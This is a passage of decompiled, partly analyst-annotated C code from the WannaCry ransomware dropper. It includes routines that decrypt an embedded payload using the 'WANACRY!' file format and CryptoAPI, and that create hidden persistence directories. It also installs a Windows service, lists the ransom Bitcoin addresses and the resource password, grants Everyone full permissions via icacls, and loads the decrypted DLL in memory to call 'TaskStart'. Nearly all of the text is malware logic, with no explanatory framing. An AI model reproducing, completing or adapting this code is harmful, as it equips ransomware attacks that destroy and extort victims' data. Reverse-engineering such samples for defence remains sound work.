  byte *pbVar3;
  undefined4 *in_FS_OFFSET;
  size_t local_248;
  undefined4 local_244;
  undefined local_240;
  undefined4 local_23f;
  undefined2 uStack571;
  undefined uStack569;
  uint local_238;
  uint local_234;
  byte local_230 [512];
  size_t local_30;
  byte *local_2c;
  uint local_28;
  int local_24;
  uint local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_004081e0;
  puStack16 = &DAT_004076f4;
  local_14 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_14;
  pbVar3 = (byte *)0x0;
  local_30 = 0;
  local_248 = 0;
  local_240 = 0;
  local_23f = 0;
  uStack571 = 0;
  uStack569 = 0;
  local_244 = 0;
  local_20[0] = 0;
  local_8 = 0;
  hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,(PLARGE_INTEGER)&local_28);
    if ((local_24 < 1) && ((local_24 < 0 || (local_28 < 0x6400001)))) {
      iVar2 = (*_DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*_DAT_0040f880)(hFile,&local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248 == 0x100)) {
            iVar2 = (*_DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*_DAT_0040f880)(hFile,&local_244,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*_DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1((void *)((int)this + 4),*(void **)((int)this + 0x4c8),
                                       local_248,local_230,&local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76((void *)((int)this + 0x54),local_230,(uint *)PTR_DAT_0040f578,
                                 local_30,(byte *)0x10);
                    local_2c = (byte *)GlobalAlloc(0,local_238);
                    if (local_2c != (byte *)0x0) {
                      iVar2 = (*_DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),local_28,
                                               local_20,0);
                      pbVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77((void *)((int)this + 0x54),*(byte **)((int)this + 0x4c8),
                                     local_2c,local_20[0],1);
                        *param_2 = local_238;
                        pbVar3 = pbVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  _local_unwind2(&local_14,0xffffffff);
  *in_FS_OFFSET = local_14;
  return pbVar3;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040170a(void) {
  int iVar1;
  HMODULE hModule;
  
  iVar1 = FUN_00401a45();
  if (iVar1 != 0) {
    if (_DAT_0040f878 != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_0040ebe8);
    if (hModule != (HMODULE)0x0) {
      _DAT_0040f878 = GetProcAddress(hModule,s_CreateFileW_0040ebdc);
      _DAT_0040f87c = GetProcAddress(hModule,s_WriteFile_0040ebd0);
      _DAT_0040f880 = GetProcAddress(hModule,s_ReadFile_0040ebc4);
      _DAT_0040f884 = GetProcAddress(hModule,s_MoveFileW_0040ebb8);
      _DAT_0040f888 = GetProcAddress(hModule,s_MoveFileExW_0040ebac);
      _DAT_0040f88c = GetProcAddress(hModule,s_DeleteFileW_0040eba0);
      _DAT_0040f890 = GetProcAddress(hModule,s_CloseHandle_0040eb94);
      if ((((_DAT_0040f878 != (FARPROC)0x0) && (_DAT_0040f87c != (FARPROC)0x0)) &&
          (_DAT_0040f880 != (FARPROC)0x0)) &&
         (((_DAT_0040f884 != (FARPROC)0x0 && (_DAT_0040f888 != (FARPROC)0x0)) &&
          ((_DAT_0040f88c != (FARPROC)0x0 && (_DAT_0040f890 != (FARPROC)0x0)))))) {
        return 1;
      }
    }
  }
  return 0;
}

undefined4 * __fastcall FUN_004017dd(undefined4 *param_1) {
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = 0x4081ec;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}

undefined4 * __thiscall FUN_004017ff(void *this,byte param_1) {
  FUN_0040181b((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_0040181b(undefined4 *param_1) {
  *param_1 = 0x4081ec;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_0040182c(int param_1) {
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = (*_DAT_0040f894)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x40f08c,0x18,0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1) {
  int iVar1;
  
  iVar1 = FUN_0040182c((int)this);
  if (iVar1 != 0) {
    if (param_1 == (LPCSTR)0x0) {
      iVar1 = (*_DAT_0040f898)(*(undefined4 *)((int)this + 4),&DAT_0040ebf8,0x494,0,0,(int)this + 8)
      ;
    }
    else {
      iVar1 = FUN_004018f9(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
    }
    if (iVar1 != 0) {
      return 1;
    }
  }
  FUN_004018b9((int)this);
  return 0;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_004018b9(int param_1) {
  if (*(int *)(param_1 + 8) != 0) {
    (*_DAT_0040f89c)(*(int *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    (*_DAT_0040f89c)(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3) {
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 *in_FS_OFFSET;
  DWORD local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_004081f0;
  puStack16 = &DAT_004076f4;
  local_14 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_14;
  uVar3 = 0;
  local_20[0] = 0;
  local_8 = 0;
  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    dwBytes = GetFileSize(hFile,(LPDWORD)0x0);
    if ((dwBytes != 0xffffffff) && (dwBytes < 0x19001)) {
      lpBuffer = GlobalAlloc(0,dwBytes);
      if (lpBuffer != (HGLOBAL)0x0) {
        BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0);
        if (BVar1 != 0) {
          iVar2 = (*_DAT_0040f898)(param_1,lpBuffer,local_20[0],0,0,param_2);
          if (iVar2 != 0) {
            uVar3 = 1;
          }
        }
      }
    }
  }
  _local_unwind2(&local_14,0xffffffff);
  *in_FS_OFFSET = local_14;
  return uVar3;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param_4) {
  LPCRITICAL_SECTION lpCriticalSection;
  int iVar1;
  
  if (*(int *)((int)this + 8) != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
    EnterCriticalSection(lpCriticalSection);
    iVar1 = (*_DAT_0040f8a4)(*(undefined4 *)((int)this + 8),0,1,0,param_1,&param_2);
    if (iVar1 != 0) {
      LeaveCriticalSection(lpCriticalSection);
      memcpy(param_3,param_1,param_2);
      *param_4 = param_2;
      return 1;
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 0;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00401a45(void) {
  HMODULE hModule;
  undefined4 uVar1;
  
  if (_DAT_0040f894 == (FARPROC)0x0) {
    hModule = LoadLibraryA(s_advapi32_dll_0040e020);
    if (hModule != (HMODULE)0x0) {
      _DAT_0040f894 = GetProcAddress(hModule,s_CryptAcquireContextA_0040f110);
      _DAT_0040f898 = GetProcAddress(hModule,s_CryptImportKey_0040f100);
      _DAT_0040f89c = GetProcAddress(hModule,s_CryptDestroyKey_0040f0f0);
      _DAT_0040f8a0 = GetProcAddress(hModule,s_CryptEncrypt_0040f0e0);
      _DAT_0040f8a4 = GetProcAddress(hModule,s_CryptDecrypt_0040f0d0);
      _DAT_0040f8a8 = GetProcAddress(hModule,s_CryptGenKey_0040f0c4);
      if ((((_DAT_0040f894 != (FARPROC)0x0) && (_DAT_0040f898 != (FARPROC)0x0)) &&
          (_DAT_0040f89c != (FARPROC)0x0)) &&
         (((_DAT_0040f8a0 != (FARPROC)0x0 && (_DAT_0040f8a4 != (FARPROC)0x0)) &&
          (_DAT_0040f8a8 != (FARPROC)0x0)))) goto LAB_00401aec;
    }
    uVar1 = 0;
  }
  else {
LAB_00401aec:
    uVar1 = 1;
  }
  return uVar1;
}

int create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out) {
  BOOL BVar1;
  DWORD DVar2;
  
  CreateDirectoryW(dir_1,(LPSECURITY_ATTRIBUTES)0x0);
  BVar1 = SetCurrentDirectoryW(dir_1);
  if (BVar1 != 0) {
    CreateDirectoryW(dir_2,(LPSECURITY_ATTRIBUTES)0x0);

    // Set file/folder to hidden & system
    BVar1 = SetCurrentDirectoryW(dir_2);
    if (BVar1 != 0) {
      DVar2 = GetFileAttributesW(dir_2);
      SetFileAttributesW(dir_2,DVar2 | 6);
      if (dir_out != (wchar_t *)0x0) {
        // u__s__s_0040eb88 = 
        swprintf(dir_out,u__s__s_0040eb88,dir_1,dir_2);
      }
      return 1;
    }
  }
  return 0;
}

uint create_and_cwd_random_hidden_directory(wchar_t *cwd_out) {
  DWORD pd_attr;
  wchar_t *pwVar1;
  int iVar2;
  undefined4 *puVar3;
  WCHAR programdata_path;
  undefined4 local_2d2 [129];
  WCHAR randomstring_w;
  undefined4 local_ca [49];
  
  iVar2 = 0x81;
  puVar3 = (undefined4 *)&stack0xfffffb26;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  
  *(undefined2 *)puVar3 = 0;
  iVar2 = 0x81;
  programdata_path = DAT_0040f874;
  puVar3 = local_2d2;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  
  *(undefined2 *)puVar3 = 0;
  iVar2 = 0x31;
  randomstring_w = DAT_0040f874;
  puVar3 = local_ca;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }

  *(undefined2 *)puVar3 = 0;
  MultiByteToWideChar(0,0,(LPCSTR)&randomstring,-1,&randomstring_w,99);
  
  // gets C:\ or C:\Windows
  GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);

  // u__s_ProgramData_0040f40c = C:\ProgramData or C:\Windows\ProgramData
  // C:\ProgramData or C:\Windows\ProgramData

  swprintf(&programdata_path,u__s_ProgramData_0040f40c,&stack0xfffffb24);
  pd_attr = GetFileAttributesW(&programdata_path);
  
  if ((pd_attr == 0xffffffff) ||
      
     (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {
    
    //u__s_Intel_0040f3f8 = C:\Intel or C:\Windows\Intel
    // C:\Intel or C:\Windows\Intel
    swprintf(&programdata_path,u__s_Intel_0040f3f8,(wchar_t *)&stack0xfffffb24);
    iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
    
    if ((iVar2 == 0) &&
       (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0 /*C:\*randomstring* */))
    {
      GetTempPathW(0x104,&programdata_path);
      pwVar1 = wcsrchr(&programdata_path,L'\\');
    
      if (pwVar1 != (wchar_t *)0x0) {
        pwVar1 = wcsrchr(&programdata_path,L'\\');
        *pwVar1 = L'\0';
      }
    
      iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
    
      return (uint)(iVar2 != 0);
    }
  }
  
  return 1;
}

undefined4 __cdecl create_taskche_service(char *path_to_taskche) {
  undefined4 uVar1;
  SC_HANDLE hService;
  CHAR local_410 [1024];
  SC_HANDLE randomstring_service;
  undefined4 local_c;
  SC_HANDLE scmanager;
  
  local_c = 0;
  scmanager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  
  if (scmanager == (SC_HANDLE)0x0) {
    uVar1 = 0;
  } else {
    randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);
    
    if (randomstring_service == (SC_HANDLE)0x0) {

      // s_cmd_exe__c___s__0040f42c = cmd.exe /c \"%s
      sprintf(local_410,s_cmd_exe__c___s__0040f42c,path_to_taskche);
      hService = CreateServiceA(scmanager,(LPCSTR)&randomstring,(LPCSTR)&randomstring,0xf01ff,0x10,2
                                ,1,local_410,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
                                (LPCSTR)0x0);
      uVar1 = local_c;
      
      if (hService != (SC_HANDLE)0x0) {
        StartServiceA(hService,0,(LPCSTR *)0x0);
        CloseServiceHandle(hService);
        local_c = 1;
        uVar1 = local_c;
      }

    } else {
      StartServiceA(randomstring_service,0,(LPCSTR *)0x0);
      CloseServiceHandle(randomstring_service);
      uVar1 = 1;
    }

    CloseServiceHandle(scmanager);
  }

  return uVar1;
}

undefined4 __cdecl FUN_00401dab(HMODULE param_1,char *param_2) {
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar1;
  DWORD DVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  char *pcVar7;
  int local_130;
  undefined4 local_12c [74];
  
  hResInfo = FindResourceA(param_1,(LPCSTR)2058,&DAT_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
    DVar2 = SizeofResource(param_1,hResInfo);
    piVar3 = (int *)FUN_004075ad(pvVar1,DVar2,param_2);
    if (piVar3 != (int *)0x0) {
      local_130 = 0;
      iVar5 = 0x4a;
      puVar6 = local_12c;

      while (iVar5 != 0) {
        iVar5 = iVar5 + -1;
        *puVar6 = 0;
        puVar6 = puVar6 + 1;
      }
      
      FUN_004075c4(piVar3,(char *)0xffffffff,&local_130);
      
      iVar5 = local_130;
      pcVar7 = (char *)0x0;
      
      if (0 < local_130) {
        do {
          FUN_004075c4(piVar3,pcVar7,&local_130);
          iVar4 = strcmp((char *)local_12c,s_c_wnry_0040e010);
          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff)) {
            FUN_0040763d(piVar3,pcVar7,(char *)local_12c);
          }

          pcVar7 = pcVar7 + 1;
        } while ((int)pcVar7 < iVar5);
      }
      
      FUN_00407656(piVar3);
      return 1;
    }
  }

  return 0;
}

void bitcoin_something(void) {
  uint uVar1;
  int iVar2;
  undefined local_31c [178];
  char local_26a [602];
  char *bitcoin_addresses [3];
  
  // s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
  // s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"
  // s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"

  bitcoin_addresses[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
  bitcoin_addresses[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
  bitcoin_addresses[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
  uVar1 = FUN_00401000(local_31c,1);

  if (uVar1 != 0) {
    iVar2 = rand();
    strcpy(local_26a,local_10[iVar2 % 3]);
    FUN_00401000(local_31c,0);
  }

  return;
}

undefined4 __cdecl acquire_taskche_mutex(int number_of_tries) {
  HANDLE hObject;
  int iVar1;
  CHAR local_68 [100];
  
  sprintf(local_68,s__s_d_0040f4ac,s_Global_MsWinZonesCacheCounterMut_0040f4b4,0);
  iVar1 = 0;
  
  // if mutex acquisition is successful return 1 
  if (0 < number_of_tries) {
    do {
      hObject = OpenMutexA(0x100000,1,local_68);
      if (hObject != (HANDLE)0x0) {
        CloseHandle(hObject);
        return 1;
      }

      // sleep and try again
      Sleep(1000);
      iVar1 = iVar1 + 1;
    } while (iVar1 < number_of_tries);
  }

  // if mutex couldn't be acquired return 0
  return 0;
}

undefined4 create_or_start_taskche_service(void) {
  int iVar1;
  undefined4 *puVar2;
  CHAR path_to_taskche;
  undefined4 local_20b;
  
  path_to_taskche = DAT_0040f910;
  iVar1 = 0x81;
  puVar2 = &local_20b;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  GetFullPathNameA(s_tasksche_exe_0040f4d8,0x208,&path_to_taskche,(LPSTR *)0x0);
  iVar1 = create_taskche_service(&path_to_taskche);
  if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
    return 1;
  }
  iVar1 = run_command(&path_to_taskche,0,(LPDWORD)0x0);
  if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
    return 1;
  }
  return 0;
}

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow) {
  
  int *argc;
  char ***argv;
  uint uVar1;
  DWORD DVar2;
  short *psVar3;
  code *pcVar4;
  int arg1_cmp;
  undefined4 *puVar5;
  char *_s__i;
  undefined local_6e8 [1240];
  char filename [520];
  uint local_8;
  
  filename[0] = DAT_0040f910;
  arg1_cmp = 0x81;
  puVar5 = (undefined4 *)(filename + 1);
  
  //memset
  while (arg1_cmp != 0) {
    arg1_cmp = arg1_cmp + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }

  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,filename,520);
  randomstring_generator((char *)&randomstring);

  argc = (int *)__p___argc();
  
  if (*argc == 2) {
    _s__i = s__i_0040f538;
    argv = (char ***)__p___argv();
    
    // strcmp(argv[i], "/i");

    arg1_cmp = strcmp((*argv)[1],_s__i);

    if ((arg1_cmp == 0) &&
       (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
         // s_tasksche_exe_0040f4d8 = tasksche.exe
      CopyFileA(filename,s_tasksche_exe_0040f4d8,0);
      DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
      
      if ((DVar2 != 0xffffffff) && (arg1_cmp = create_or_start_taskche_service(), arg1_cmp != 0)) {
        return 0;
      }
    }
  }
  
  _s__i = strrchr(filename,0x5c);
  
  if (_s__i != (char *)0x0) {
    _s__i = strrchr(filename,0x5c);
    *_s__i = '\0';
  }
  
  SetCurrentDirectoryA(filename);
  set_or_query_registry_cwd(1);
  //s_WNcry_2ol7_0040f52c = WNcry@2ol7
  FUN_00401dab((HMODULE)0x0,s_WNcry_2ol7_0040f52c);
  bitcoin_something();
  run_command(s_attrib__h___0040f520,0,(LPDWORD)0x0);
  run_command(s_icacls____grant_Everyone_F__T__C_0040f4fc,0,(LPDWORD)0x0);
  arg1_cmp = FUN_0040170a();
  if (arg1_cmp != 0) {
    FUN_004012fd();
    arg1_cmp = FUN_00401437(local_6e8,(LPCSTR)0x0,0,0);
    if (arg1_cmp != 0) {
      local_8 = 0;
      psVar3 = (short *)FUN_004014a6(local_6e8,s_t_wnry_0040f4f4,&local_8);
      if (((psVar3 != (short *)0x0) &&
          (argc = (int *)FUN_004021bd(psVar3,local_8), argc != (int *)0x0)) &&
         (pcVar4 = (code *)FUN_00402924(argc,s_TaskStart_0040f4e8), pcVar4 != (code *)0x0)) {
        (*pcVar4)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}

void __cdecl FUN_004021bd(short *param_1,uint param_2) {
  FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,(uint)&LAB_00402198,&LAB_004021a3,
               (uint)&LAB_004021b2,0);
  return;
}

uint * __cdecl
FUN_004021e9(short *param_1,uint param_2,undefined *param_3,undefined *param_4,uint param_5,
            undefined *param_6,uint param_7,uint param_8) {
  int iVar1;
  HMODULE pHVar2;
  code *pcVar3;
  uint uVar4;
  HANDLE hHeap;
  uint *puVar5;
  void *_Dst;
  int *piVar6;
  uint uVar7;
  int *piVar8;
  DWORD dwFlags;
  SIZE_T dwBytes;
  undefined local_2c [4];
  uint local_28;
  uint local_8;
  
  local_8 = 0;
  iVar1 = FUN_00402457(param_2,0x40);
  if (iVar1 == 0) {
    return (uint *)0x0;
  }
  if (*param_1 == 0x5a4d) {
    iVar1 = FUN_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
    if (iVar1 == 0) {
      return (uint *)0x0;
    }
    piVar8 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
    if (((*piVar8 == 0x4550) && (*(short *)(piVar8 + 1) == 0x14c)) && ((piVar8[0xe] & 1U) == 0)) {
      uVar7 = (uint)*(ushort *)((int)piVar8 + 6);
      if (*(ushort *)((int)piVar8 + 6) != 0) {
        piVar6 = (int *)((int)piVar8 + (uint)*(ushort *)(piVar8 + 5) + 0x24);
        do {
          uVar4 = piVar6[1];
          if (uVar4 == 0) {
            uVar4 = piVar8[0xe];
          }
          if (local_8 < *piVar6 + uVar4) {
            local_8 = *piVar6 + uVar4;
          }
          piVar6 = piVar6 + 10;
          uVar7 = uVar7 - 1;
        } while (uVar7 != 0);
      }
      pHVar2 = GetModuleHandleA(s_kernel32_dll_0040ebe8);
      if (pHVar2 == (HMODULE)0x0) {
        return (uint *)0x0;
      }
      pcVar3 = (code *)(*(code *)param_6)(pHVar2,s_GetNativeSystemInfo_0040f55c,0);
      if (pcVar3 == (code *)0x0) {
        return (uint *)0x0;
      }
      (*pcVar3)(local_2c);
      uVar7 = piVar8[0x14] + -1 + local_28 & ~(local_28 - 1);
      if (uVar7 == ((local_28 - 1) + local_8 & ~(local_28 - 1))) {
        uVar4 = (*(code *)param_3)(piVar8[0xd],uVar7,0x3000,4,param_8);
        if ((uVar4 != 0) || (uVar4 = (*(code *)param_3)(0,uVar7,0x3000,4,param_8), uVar4 != 0)) {
          dwBytes = 0x3c;
          dwFlags = 8;
          hHeap = GetProcessHeap();
          puVar5 = (uint *)HeapAlloc(hHeap,dwFlags,dwBytes);
          if (puVar5 != (uint *)0x0) {
            puVar5[1] = uVar4;
            puVar5[5] = ((uint)*(ushort *)((int)piVar8 + 0x16) & 0x2000) >> 0xd;
            *(undefined **)(puVar5 + 7) = param_3;
            *(undefined **)(puVar5 + 8) = param_4;
            puVar5[9] = param_5;
            *(undefined **)(puVar5 + 10) = param_6;
            puVar5[0xb] = param_7;
            puVar5[0xc] = param_8;
            puVar5[0xe] = local_28;
            iVar1 = FUN_00402457(param_2,piVar8[0x15]);
            if (iVar1 != 0) {
              _Dst = (void *)(*(code *)param_3)(uVar4,piVar8[0x15],0x1000,4,param_8);
              memcpy(_Dst,param_1,piVar8[0x15]);
              iVar1 = *(int *)(param_1 + 0x1e);
              *puVar5 = iVar1 + (int)_Dst;
              *(uint *)(iVar1 + (int)_Dst + 0x34) = uVar4;
              iVar1 = FUN_00402470((int)param_1,param_2,(int)piVar8,(int *)puVar5);
              if (iVar1 != 0) {
                iVar1 = *(int *)(*puVar5 + 0x34) - piVar8[0xd];
                if (iVar1 == 0) {
                  puVar5[6] = 1;
                }
                else {
                  uVar7 = FUN_00402758((int *)puVar5,iVar1);
                  puVar5[6] = uVar7;
                }
                iVar1 = FUN_004027df(puVar5);
                if (((iVar1 != 0) && (uVar7 = FUN_0040254b((int *)puVar5), uVar7 != 0)) &&
                   (iVar1 = FUN_0040271d((int *)puVar5), iVar1 != 0)) {
                  iVar1 = *(int *)(*puVar5 + 0x28);
                  if (iVar1 == 0) {
                    puVar5[0xd] = 0;
                    return puVar5;
                  }
                  if (puVar5[5] == 0) {
                    puVar5[0xd] = iVar1 + uVar4;
                    return puVar5;
                  }
                  iVar1 = (*(code *)(iVar1 + uVar4))(uVar4,1,0);
                  if (iVar1 != 0) {
                    puVar5[4] = 1;
                    return puVar5;
                  }
                  SetLastError(0x45a);
                }
              }
            }
            FUN_004029cc((int *)puVar5);
            return (uint *)0x0;
          }
          (*(code *)param_4)(uVar4,0,0x8000,param_8);
        }
        dwFlags = 0xe;
        goto LAB_00402219;
      }
    }
  }
  dwFlags = 0xc1;
LAB_00402219:
  SetLastError(dwFlags);
  return (uint *)0x0;
}

undefined4 __cdecl FUN_00402457(uint param_1,uint param_2) {
  if (param_1 < param_2) {
    SetLastError(0xd);
    return 0;
  }
  return 1;
}

undefined4 __cdecl FUN_00402470(int param_1,uint param_2,int param_3,int *param_4) {
  int iVar1;
  size_t _Size;
  size_t *psVar2;
  int iVar3;
  size_t *psVar4;
  int local_8;
  
  local_8 = 0;
  iVar1 = param_4[1];
  iVar3 = *param_4;
  psVar2 = (size_t *)((uint)*(ushort *)(iVar3 + 0x14) + iVar3);
  if (*(short *)(iVar3 + 6) != 0) {
    do {
      psVar4 = psVar2 + 10;
      if (*psVar4 == 0) {
        _Size = *(size_t *)(param_3 + 0x38);
        if (0 < (int)_Size) {
          iVar3 = (*(code *)param_4[7])(iVar1 + psVar2[9],_Size,0x1000,4,param_4[0xc]);
          if (iVar3 == 0) {
            return 0;
          }
          *(void **)(psVar2 + 8) = (void *)(iVar1 + psVar2[9]);
          memset((void *)(iVar1 + psVar2[9]),0,_Size);
        }
      }
      else {
        iVar3 = FUN_00402457(param_2,psVar2[0xb] + *psVar4);
        if ((iVar3 == 0) ||
           (iVar3 = (*(code *)param_4[7])(iVar1 + psVar2[9],*psVar4,0x1000,4,param_4[0xc]),
           iVar3 == 0)) {
          return 0;
        }
        _Size = psVar2[9];
        memcpy((void *)(iVar1 + _Size),(void *)(psVar2[0xb] + param_1),*psVar4);
        *(void **)(psVar2 + 8) = (void *)(iVar1 + _Size);
      }
      local_8 = local_8 + 1;
      psVar2 = psVar4;
    } while (local_8 < (int)(uint)*(ushort *)(*param_4 + 6));
  }
  return 1;
}

uint __cdecl FUN_0040254b(int *param_1) {
  int iVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  uint uVar5;
  LPVOID local_20;
  uint local_1c;
  int local_18;
  uint local_14;
  undefined4 local_10;
  int local_c;
  LPVOID local_8;
  
  piVar3 = param_1;
  iVar1 = (uint)*(ushort *)(*param_1 + 0x14) + 0x18 + *param_1;
  local_20 = *(LPVOID *)(iVar1 + 8);
  local_1c = ~(param_1[0xe] - 1U) & (uint)local_20;
  local_18 = FUN_0040264f(param_1,iVar1);
  local_14 = *(uint *)(iVar1 + 0x24);
  local_10 = 0;
  iVar2 = *param_1;
  param_1 = (int *)0x1;
  if (1 < *(ushort *)(iVar2 + 6)) {
    do {
      local_8 = *(LPVOID *)(iVar1 + 0x30);
      uVar5 = ~(piVar3[0xe] - 1U) & (uint)local_8;
      local_c = FUN_0040264f(piVar3,iVar1 + 0x28);
      if ((local_1c == uVar5) || (uVar5 < (uint)(local_18 + (int)local_20))) {
        uVar5 = *(uint *)(iVar1 + 0x4c);
        if (((uVar5 & 0x2000000) == 0) || ((local_14 & 0x2000000) == 0)) {
          local_14 = (uVar5 | local_14) & 0xfdffffff;
        }
        else {
          local_14 = local_14 | uVar5;
        }
        local_18 = (local_c - (int)local_20) + (int)local_8;
      }
      else {
        uVar4 = FUN_0040267b(piVar3,&local_20);
        if (uVar4 == 0) {
          return 0;
        }
        local_20 = local_8;
        local_18 = local_c;
        local_14 = *(uint *)(iVar1 + 0x4c);
        local_1c = uVar5;
      }
      param_1 = (int *)((int)param_1 + 1);
      iVar1 = iVar1 + 0x28;
    } while ((int)param_1 < (int)(uint)*(ushort *)(*piVar3 + 6));
  }
  local_10 = 1;
  uVar5 = FUN_0040267b(piVar3,&local_20);
  return (uint)(uVar5 != 0);
}

